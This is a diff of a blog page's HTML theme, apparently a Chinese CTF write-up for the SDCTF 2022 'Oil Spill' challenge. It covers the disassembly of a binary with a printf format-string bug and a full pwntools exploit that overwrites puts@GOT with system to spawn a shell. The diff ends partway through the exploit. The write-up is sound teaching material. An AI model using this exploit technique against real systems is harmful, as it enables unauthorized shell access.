@@ -1,348 +1,198 @@
-<!DOCTYPE html>
-<html lang="en">
-
-<head>
-    <meta charset="UTF-8">
-<meta name="viewport"
-      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
-<meta http-equiv="X-UA-Compatible" content="ie=edge">
-
-    <meta name="author" content="Mykonos">
-
-
-
-
-
-<title>SDCTF 2022 Oil Spill | Silence to hear.</title>
-
-
-
-    <link rel="icon" href="/ico.ico">
-
-
-
-
-    <!-- stylesheets list from _config.yml -->
-    
-    <link rel="stylesheet" href="/css/style.css">
-    
-
-
-
-    <!-- scripts list from _config.yml -->
-    
-    <script src="/js/script.js"></script>
-    
-    <script src="/js/tocbot.min.js"></script>
-    
-
-
-
-    
-    
-        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
-<script type="text/x-mathjax-config">
-    MathJax.Hub.Config({
-    "HTML-CSS": {
-        preferredFont: "TeX",
-        availableFonts: ["STIX","TeX"],
-        linebreaks: { automatic:true },
-        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
-    },
-    tex2jax: {
-        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
-        processEscapes: true,
-        ignoreClass: "tex2jax_ignore|dno",
-        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
-    },
-    TeX: {
-        equationNumbers: { autoNumber: "AMS" },
-        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
-        Macros: { href: "{}" }
-    },
-    messageStyle: "none"
-    });
-</script>
-<!-- 给MathJax元素添加has-jax class -->
-<script type="text/x-mathjax-config">
-    MathJax.Hub.Queue(function() {
-        var all = MathJax.Hub.getAllJax(), i;
-        for(i=0; i < all.length; i += 1) {
-            all[i].SourceElement().parentNode.className += ' has-jax';
-        }
-    });
-</script>
-<!-- 通过连接CDN加载MathJax的js代码 -->
-<script type="text/javascript" async
-        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
-</script>
-
-
-    
-
-
-<meta name="generator" content="Hexo 6.3.0"></head>
-
-<body>
-    <script>
-        // this function is used to check current theme before page loaded.
-        (() => {
-            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
-            const isDark = currentTheme === 'dark';
-            const pagebody = document.getElementsByTagName('body')[0]
-            if (isDark) {
-                pagebody.classList.add('dark-theme');
-                // mobile
-                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
-            } else {
-                pagebody.classList.remove('dark-theme');
-                // mobile
-                document.getElementById("mobile-toggle-theme").innerText = "· Light"
-            }
-        })();
-    </script>
-
-    <div class="wrapper">
-        <header>
-    <nav class="navbar">
-        <div class="container">
-            <div class="navbar-header header-logo"><a href="/">Mykonos-x&#39;s Blog</a></div>
-            <div class="menu navbar-right">
-                
-                    <a class="menu-item" href="/archives">Posts</a>
-                
-                    <a class="menu-item" href="/tag">Tags</a>
-                
-                    <a class="menu-item" href="/about">About</a>
-                
-                <input id="switch_default" type="checkbox" class="switch_default">
-                <label for="switch_default" class="toggleBtn"></label>
-            </div>
-        </div>
-    </nav>
-
-    
-    <nav class="navbar-mobile" id="nav-mobile">
-        <div class="container">
-            <div class="navbar-header">
-                <div>
-                    <a href="/">Mykonos-x&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
-                </div>
-                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
-            </div>
-            <div class="menu" id="mobile-menu">
-                
-                    <a class="menu-item" href="/archives">Posts</a>
-                
-                    <a class="menu-item" href="/tag">Tags</a>
-                
-                    <a class="menu-item" href="/about">About</a>
-                
-            </div>
-        </div>
-    </nav>
-
-</header>
-<script>
-    var mobileBtn = function f() {
-        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
-        var mobileMenu = document.getElementById("mobile-menu");
-        if(toggleMenu.classList.contains("active")){
-           toggleMenu.classList.remove("active")
-            mobileMenu.classList.remove("active")
-        }else{
-            toggleMenu.classList.add("active")
-            mobileMenu.classList.add("active")
-        }
-    }
-</script>
-            <div class="main">
-                <div class="container">
-    
-    
-        <div class="post-toc">
-    <div class="tocbot-list">
-    </div>
-    <div class="tocbot-list-menu">
-        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
-        <a onclick="go_top()">Back to top</a>
-        <a onclick="go_bottom()">Go to bottom</a>
-    </div>
-</div>
-
-<script>
-    var tocbot_timer;
-    var DEPTH_MAX = 6; // 为 6 时展开所有
-    var tocbot_default_config = {
-        tocSelector: '.tocbot-list',
-        contentSelector: '.post-content',
-        headingSelector: 'h1, h2, h3, h4, h5',
-        orderedList: false,
-        scrollSmooth: true,
-        onClick: extend_click,
-    };
-
-    function extend_click() {
-        clearTimeout(tocbot_timer);
-        tocbot_timer = setTimeout(function() {
-            tocbot.refresh(obj_merge(tocbot_default_config, {
-                hasInnerContainers: true
-            }));
-        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
-    }
-
-    document.ready(function() {
-        tocbot.init(obj_merge(tocbot_default_config, {
-            collapseDepth: 1
-        }));
-    });
-
-    function expand_toc() {
-        var b = document.querySelector('.tocbot-toc-expand');
-        var expanded = b.getAttribute('data-expanded');
-        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
-        tocbot.refresh(obj_merge(tocbot_default_config, {
-            collapseDepth: expanded ? 1 : DEPTH_MAX
-        }));
-        b.innerText = expanded ? 'Expand all' : 'Collapse all';
-    }
-
-    function go_top() {
-        window.scrollTo(0, 0);
-    }
-
-    function go_bottom() {
-        window.scrollTo(0, document.body.scrollHeight);
-    }
-
-    function obj_merge(target, source) {
-        for (var item in source) {
-            if (source.hasOwnProperty(item)) {
-                target[item] = source[item];
-            }
-        }
-        return target;
-    }
-</script>
-    
-
-    
-    <article class="post-wrap">
-        <header class="post-header">
-            <h1 class="post-title">SDCTF 2022 Oil Spill</h1>
-            
-                <div class="post-meta">
-                    
-                        Author: <a itemprop="author" rel="author" href="/">Mykonos</a>
-                    
-
-                    
-                        <span class="post-time">
-                        Date: <a href="#">July 5, 2022&nbsp;&nbsp;0:54:00</a>
-                        </span>
-                    
-                    
-                </div>
-            
-        </header>
-
-        <div class="post-content">
-            <h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
-
+<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>SDCTF 2022 Oil Spill | Silence to hear.</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.6.1/MathJax.js"></script><script>MathJax.Hub.Config({
+ menuSettings: {
+   zoom: "None"
+ },
+ showMathMenu: false,
+ jax: ["input/TeX","output/CommonHTML"],
+ extensions: ["tex2jax.js"],
+ TeX: {
+   extensions: ["AMSmath.js","AMSsymbols.js"],
+   equationNumbers: {
+     autoNumber: "AMS"
+   }
+ },
+ tex2jax: {
+   inlineMath: [["\\(", "\\)"]],
+   displayMath: [["\\[", "\\]"]]
+ }
+});</script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
+ document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark')
+ document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: Bender;
+ src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
+}
+@font-face {
+ font-family: BenderLight;
+ src: local('BenderLight'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
+  --light-background: url('/img/bk.jpg');
+}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>SDCTF 2022 Oil Spill</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2022-07-04T16:54:00.000Z" id="date"> 2022-07-05</time></div></span></div></div><hr><div id="post-content"><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><pre><code class="shell">    Arch:     amd64-64-little
+    RELRO:    No RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</code></pre>
 <p>开启了Canary和堆栈不可执行</p>
-<h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">                push    rbp</span><br><span class="line">.text:000000000040068B                 mov     rbp, rsp</span><br><span class="line">.text:000000000040068E                 sub     rsp, 150h</span><br><span class="line">.text:0000000000400695                 mov     [rbp+var_144], edi</span><br><span class="line">.text:000000000040069B                 mov     [rbp+var_150], rsi</span><br><span class="line">.text:00000000004006A2                 mov     rax, fs:28h</span><br><span class="line">.text:00000000004006AB                 mov     [rbp+var_8], rax</span><br><span class="line">.text:00000000004006AF                 xor     eax, eax</span><br><span class="line">.text:00000000004006B1                 lea     rax, [rbp+s]</span><br><span class="line">.text:00000000004006B8                 lea     r8, temp</span><br><span class="line">.text:00000000004006BF                 mov     rcx, rax</span><br><span class="line">.text:00000000004006C2                 mov     rax, cs:printf_ptr</span><br><span class="line">.text:00000000004006C9                 mov     rdx, rax</span><br><span class="line">.text:00000000004006CC                 mov     rax, cs:puts_ptr</span><br><span class="line">.text:00000000004006D3                 mov     rsi, rax</span><br><span class="line">.text:00000000004006D6                 lea     rdi, format     ; &quot;%p, %p, %p, %p\n&quot;</span><br><span class="line">.text:00000000004006DD                 mov     eax, 0</span><br><span class="line">.text:00000000004006E2                 call    printf</span><br><span class="line">.text:00000000004006E7                 lea     rdi, aOhNoWeSpilledO ; &quot;Oh no! We spilled oil everywhere and it&quot;...</span><br><span class="line">.text:00000000004006EE                 call    puts</span><br><span class="line">.text:00000000004006F3                 lea     rdi, aDoYouHaveAnyId ; &quot;do you have any ideas of what we can us&quot;...</span><br><span class="line">.text:00000000004006FA                 call    puts</span><br><span class="line">.text:00000000004006FF                 mov     rax, cs:stdout@@GLIBC_2_2_5</span><br><span class="line">.text:0000000000400706                 mov     rdi, rax        ; stream</span><br><span class="line">.text:0000000000400709                 call    _fflush</span><br><span class="line">.text:000000000040070E                 mov     rdx, cs:stdin@@GLIBC_2_2_5 ; stream</span><br><span class="line">.text:0000000000400715                 lea     rax, [rbp+s]</span><br><span class="line">.text:000000000040071C                 mov     esi, 12Ch       ; n</span><br><span class="line">.text:0000000000400721                 mov     rdi, rax        ; s</span><br><span class="line">.text:0000000000400724                 call    _fgets</span><br><span class="line">.text:0000000000400729                 lea     rax, [rbp+s]</span><br><span class="line">.text:0000000000400730                 mov     rdi, rax        ; format</span><br><span class="line">.text:0000000000400733                 mov     eax, 0</span><br><span class="line">.text:0000000000400738                 call    printf</span><br><span class="line">.text:000000000040073D                 lea     rdi, x          ; &quot;Interesting Proposition&quot;</span><br><span class="line">.text:0000000000400744                 call    puts</span><br><span class="line">.text:0000000000400749                 mov     rax, cs:stdout@@GLIBC_2_2_5</span><br><span class="line">.text:0000000000400750                 mov     rdi, rax        ; stream</span><br><span class="line">.text:0000000000400753                 call    _fflush</span><br><span class="line">.text:0000000000400758                 mov     eax, 0</span><br><span class="line">.text:000000000040075D                 mov     rcx, [rbp+var_8]</span><br><span class="line">.text:0000000000400761                 xor     rcx, fs:28h</span><br><span class="line">.text:000000000040076A                 jz      short locret_400771</span><br><span class="line">.text:000000000040076C                 call    ___stack_chk_fail</span><br><span class="line">.text:0000000000400771 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000400771</span><br><span class="line">.text:0000000000400771 locret_400771:                          ; CODE XREF: main+E0↑j</span><br><span class="line">.text:0000000000400771                 leave</span><br><span class="line">.text:0000000000400772                 retn</span><br><span class="line">.text:0000000000400772 ; &#125; // starts at 40068A</span><br><span class="line">.text:0000000000400772 main            endp</span><br><span class="line">.text:0000000000400772</span><br></pre></td></tr></table></figure>
+<h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><pre><code class="assembly">                push    rbp
+.text:000000000040068B                 mov     rbp, rsp
+.text:000000000040068E                 sub     rsp, 150h
+.text:0000000000400695                 mov     [rbp+var_144], edi
+.text:000000000040069B                 mov     [rbp+var_150], rsi
+.text:00000000004006A2                 mov     rax, fs:28h
+.text:00000000004006AB                 mov     [rbp+var_8], rax
+.text:00000000004006AF                 xor     eax, eax
+.text:00000000004006B1                 lea     rax, [rbp+s]
+.text:00000000004006B8                 lea     r8, temp
+.text:00000000004006BF                 mov     rcx, rax
+.text:00000000004006C2                 mov     rax, cs:printf_ptr
+.text:00000000004006C9                 mov     rdx, rax
+.text:00000000004006CC                 mov     rax, cs:puts_ptr
+.text:00000000004006D3                 mov     rsi, rax
+.text:00000000004006D6                 lea     rdi, format     ; &quot;%p, %p, %p, %p\n&quot;
+.text:00000000004006DD                 mov     eax, 0
+.text:00000000004006E2                 call    printf
+.text:00000000004006E7                 lea     rdi, aOhNoWeSpilledO ; &quot;Oh no! We spilled oil everywhere and it&quot;...
+.text:00000000004006EE                 call    puts
+.text:00000000004006F3                 lea     rdi, aDoYouHaveAnyId ; &quot;do you have any ideas of what we can us&quot;...
+.text:00000000004006FA                 call    puts
+.text:00000000004006FF                 mov     rax, cs:stdout@@GLIBC_2_2_5
+.text:0000000000400706                 mov     rdi, rax        ; stream
+.text:0000000000400709                 call    _fflush
+.text:000000000040070E                 mov     rdx, cs:stdin@@GLIBC_2_2_5 ; stream
+.text:0000000000400715                 lea     rax, [rbp+s]
+.text:000000000040071C                 mov     esi, 12Ch       ; n
+.text:0000000000400721                 mov     rdi, rax        ; s
+.text:0000000000400724                 call    _fgets
+.text:0000000000400729                 lea     rax, [rbp+s]
+.text:0000000000400730                 mov     rdi, rax        ; format
+.text:0000000000400733                 mov     eax, 0
+.text:0000000000400738                 call    printf
+.text:000000000040073D                 lea     rdi, x          ; &quot;Interesting Proposition&quot;
+.text:0000000000400744                 call    puts
+.text:0000000000400749                 mov     rax, cs:stdout@@GLIBC_2_2_5
+.text:0000000000400750                 mov     rdi, rax        ; stream
+.text:0000000000400753                 call    _fflush
+.text:0000000000400758                 mov     eax, 0
+.text:000000000040075D                 mov     rcx, [rbp+var_8]
+.text:0000000000400761                 xor     rcx, fs:28h
+.text:000000000040076A                 jz      short locret_400771
+.text:000000000040076C                 call    ___stack_chk_fail
+.text:0000000000400771 ; ---------------------------------------------------------------------------
+.text:0000000000400771
+.text:0000000000400771 locret_400771:                          ; CODE XREF: main+E0↑j
+.text:0000000000400771                 leave
+.text:0000000000400772                 retn
+.text:0000000000400772 ; &#125; // starts at 40068A
+.text:0000000000400772 main            endp
+.text:0000000000400772
+</code></pre>
+<pre><code class="c">int __cdecl main(int argc, const char **argv, const char **envp)
+&#123;
+  char s[312]; // [rsp+10h] [rbp-140h] BYREF
+  unsigned __int64 v5; // [rsp+148h] [rbp-8h]
 
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">312</span>]; <span class="comment">// [rsp+10h] [rbp-140h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+148h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%p, %p, %p, %p\n&quot;</span>, &amp;<span class="built_in">puts</span>, &amp;<span class="built_in">printf</span>, s, temp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Oh no! We spilled oil everywhere and its making everything dirty&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;do you have any ideas of what we can use to clean it?&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fgets(s, <span class="number">300</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="built_in">puts</span>(x);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
+  v5 = __readfsqword(0x28u);
+  printf(&quot;%p, %p, %p, %p\n&quot;, &amp;puts, &amp;printf, s, temp);
+  puts(&quot;Oh no! We spilled oil everywhere and its making everything dirty&quot;);
+  puts(&quot;do you have any ideas of what we can use to clean it?&quot;);
+  fflush(stdout);
+  fgets(s, 300, stdin);
+  printf(s);
+  puts(x);
+  fflush(stdout);
+  return 0;
+&#125;
+</code></pre>
 <h3 id="Analyze"><a href="#Analyze" class="headerlink" title="Analyze"></a>Analyze</h3><p>程序运行输出puts，printf的地址</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x7f699d578420, 0x7f699d555c90, 0x7ffc3135dea0, 0x400677</span><br><span class="line">Oh no! We spilled oil everywhere and its making everything dirty</span><br><span class="line">do you have any ideas of what we can use to clean it?</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">0x7f699d578420, 0x7f699d555c90, 0x7ffc3135dea0, 0x400677
+Oh no! We spilled oil everywhere and its making everything dirty
+do you have any ideas of what we can use to clean it?
+</code></pre>
 <p>由于提示说本题是18.04，所以不需要用<code>LibcSearcher</code>来找libc~~~我就是这样的傻X~~~，只不过如果libc小版本对应不上的话还是需要<code>glibc-all-in-one</code></p>
 <p>接收puts,printf地址后就可以泄露libc基址了</p>
 <p>接着程序</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fgets(s, <span class="number">300</span>, <span class="built_in">stdin</span>);</span><br><span class="line"><span class="built_in">printf</span>(s);</span><br></pre></td></tr></table></figure>
-
+<pre><code class="c">  fgets(s, 300, stdin);
+  printf(s);
+</code></pre>
 <p>有format string漏洞，且偏移为<code>8</code></p>
 <p>同时</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(x);</span><br></pre></td></tr></table></figure>
-
+<pre><code class="c">puts(x);
+</code></pre>
 <p>可以利用<code>fmtstr_payload</code>将puts的got表地址替换成system，里面的<code>x</code>替换成<code>b&#39;/bin/sh\x00</code></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;elf.got[<span class="string">&#x27;puts&#x27;</span>]:system,<span class="number">0x600c80</span>:<span class="string">b&#x27;/bin/sh\x00&#x27;</span>&#125;</span><br><span class="line"><span class="comment">#fmtstr_payload中需要替换多个值时，用逗号连接，这个是我当时不知道的地方，还搞成dict了</span></span><br></pre></td></tr></table></figure>
-
+<pre><code class="python">&#123;elf.got[&#39;puts&#39;]:system,0x600c80:b&#39;/bin/sh\x00&#39;&#125;
+#fmtstr_payload中需要替换多个值时，用逗号连接，这个是我当时不知道的地方，还搞成dict了
+</code></pre>
 <p>这样当程序执行到puts(x)时实际会执行<code>system(&quot;/bin/sh\x00&quot;)</code>，getshell</p>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Arch:     amd64-64-little</span></span><br><span class="line"><span class="string">    RELRO:    No RELRO</span></span><br><span class="line"><span class="string">    Stack:    Canary found</span></span><br><span class="line"><span class="string">    NX:       NX enabled</span></span><br><span class="line"><span class="string">    PIE:      No PIE (0x400000)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from LibcSearcher import *</span></span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span> , arch = <span class="string">&quot;amd64&quot;</span> , log_level = <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">host = <span class="string">&quot;1.14.71.254&quot;</span></span><br><span class="line">port = <span class="number">28620</span></span><br><span class="line">local = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;0 for remote , 1 for local:\t&quot;</span>))</span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">    io = remote(host , port)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">1</span>:</span><br><span class="line">    io = process(<span class="string">&quot;/mnt/c/Users/M1sceden4/Desktop/OilSpill&quot;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;/mnt/c/Users/M1sceden4/Desktop/OilSpill&quot;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&quot;/home/m1sceden4/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/libc-2.27.so&quot;)</span></span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">data1 = io.recv(<span class="number">14</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;, &quot;</span>)</span><br><span class="line">data2 = io.recv(<span class="number">14</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;, &quot;</span>)</span><br><span class="line">data3 = io.recv(<span class="number">14</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;, &quot;</span>)</span><br><span class="line">data4 = io.recv(<span class="number">8</span>)</span><br><span class="line">success(<span class="string">&quot;data1 -&gt; %s&quot;</span> % data1)</span><br><span class="line">success(<span class="string">&quot;data2 -&gt; %s&quot;</span> % data2)</span><br><span class="line">success(<span class="string">&quot;data3 -&gt; %s&quot;</span> % data3)</span><br><span class="line">success(<span class="string">&quot;data4 -&gt; %s&quot;</span> % data4)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">puts_addr = <span class="built_in">int</span>(data1 , <span class="number">16</span>)</span><br><span class="line"><span class="comment"># libc = LibcSearcher(&#x27;puts&#x27; , puts_addr)</span></span><br><span class="line"></span><br><span class="line">libc_base = <span class="built_in">int</span>(data2 , <span class="number">16</span>) - libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"><span class="comment"># libc_base = libc.dump(&quot;puts&quot;) - puts_addr</span></span><br><span class="line">success(<span class="string">&quot;leak libc base -&gt; %s&quot;</span> % <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment"># system = libc_base + libc.dump(&quot;system&quot;)</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;it?\n&quot;</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">8</span> , &#123;elf.got[<span class="string">&#x27;puts&#x27;</span>]:system,<span class="number">0x600c80</span>:<span class="string">b&#x27;/bin/sh\x00&#x27;</span>&#125;)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">&#39;&#39;&#39;
+    Arch:     amd64-64-little
+    RELRO:    No RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+&#39;&#39;&#39;
+from pwn import *
+# from LibcSearcher import *
+context(os = &quot;linux&quot; , arch = &quot;amd64&quot; , log_level = &quot;debug&quot;)
+host = &quot;1.14.71.254&quot;
+port = 28620
+local = int(input(&quot;0 for remote , 1 for local:\t&quot;))
+if local == 0:
+    io = remote(host , port)
+elif local == 1:
+    io = process(&quot;/mnt/c/Users/M1sceden4/Desktop/OilSpill&quot;)
 
-        </div>
+elf = ELF(&quot;/mnt/c/Users/M1sceden4/Desktop/OilSpill&quot;)
+# libc = ELF(&quot;/home/m1sceden4/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/libc-2.27.so&quot;)
+libc = elf.libc
 
-        
-            <section class="post-copyright">
-                
-                    <p class="copyright-item">
-                        <span>Author:</span>
-                        <span>Mykonos</span>
-                    </p>
-                
-                
-                    <p class="copyright-item">
-                        <span>Permalink:</span>
-                        <span><a href="http://mykonos-x.github.io/2022/07/05/SDCTF-2022-Oil-Spill/">http://mykonos-x.github.io/2022/07/05/SDCTF-2022-Oil-Spill/</a></span>
-                    </p>
-                
-                
-                    <p class="copyright-item">
-                        <span>License:</span>
-                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
-                    </p>
-                
-                
-                     <p class="copyright-item">
-                         <span>Slogan:</span>
-                         <span><strong>You can go further</strong>.</span>
-                     </p>
-                
